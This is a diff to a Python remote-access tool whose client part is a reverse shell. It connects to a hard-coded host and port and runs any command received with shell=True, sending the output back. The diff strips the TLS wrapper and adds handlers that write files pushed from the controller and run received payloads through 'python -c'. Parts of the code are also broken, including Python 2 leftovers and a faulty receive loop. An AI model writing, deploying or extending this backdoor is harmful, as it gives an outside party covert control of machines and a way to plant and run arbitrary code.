@@ -59,6 +59,9 @@ def main():
 
 main()
 
+
+
+#### client #####
 import os
 import socket
 import subprocess
@@ -73,7 +76,7 @@ def create():
         host = '10.0.0.1'
         port = 9999
         s = socket.socket()
-        ssls = wrappedSocket = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+        ssls = s
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
 
@@ -98,27 +101,52 @@ def receive():
         args = data.split()
         if data[:2].decode("utf-8") == 'cd':
             os.chdir(data[3:].decode("utf-8"))
-        if len(data) > 0:
-            if data[:4].decode("utf-8") == 'drop':
-                f = open(args[1], 'a')
-                ssls.send('ready')
-                l = ssls.recv(1024)
-                print(l)
-                while not ('FILE_TRANSFER_COMPLETE' in str(l)):
-                #while (l):
-                    f.write(l)
-                    l = ssls.recv(1024)
-                    print("l: " + l)
-                f.close()
-                print('WRITE_FILE_COMPLETE.')
-            else:    
-                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                output_str = str(output_bytes)
-                ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                print(output_str)
+        elif data[:4].decode("utf-8") == 'drop':
+            f = open(args[1], 'wb')
+            filesize = long(args[2])
+            ssls.send('ready')
+            data = ssls.recv(1024)
+            totalRecv = len(data)
+            f.write(data)
+            while totalRecv < filesize:
+                data = ssls.recv(1024)
+                totalRecv += len(data)
+                f.write(data)
+            f.close()
+            print('WRITE_FILE_COMPLETE.')
+        elif data[:3].decode("utf-8") == 'run':
+            ssls.send('ready')
+            l = ssls.recv(1024)
+            r = l
+            print('payload before while loop: ' + r)
+            if not 'FILE_TRANSFER_COMPLETE' in str(l):
+               while not ('FILE_TRANSFER_COMPLETE' in str(l)):
+                  r += ssls.recv(1024)
+            else:
+                print('payload after 2nd: ' + r)
+                runproc('python -c ' + r)
+        elif len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_bytes)
+            ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
+            print(output_str)
     s.close()
 
+def bytes_to_number(b):
+    # if Python2.x
+    b = map(ord, b)
+    res = 0
+    for i in range(4):
+        res += b[i] << (i*8)
+    return res
+
+def runproc(data):
+    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+    output_str = str(output_bytes)
+    ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
+    print(output_str)
 
 def main():
     create()
@@ -127,5 +155,3 @@ def main():
 
 
 main()
-
-
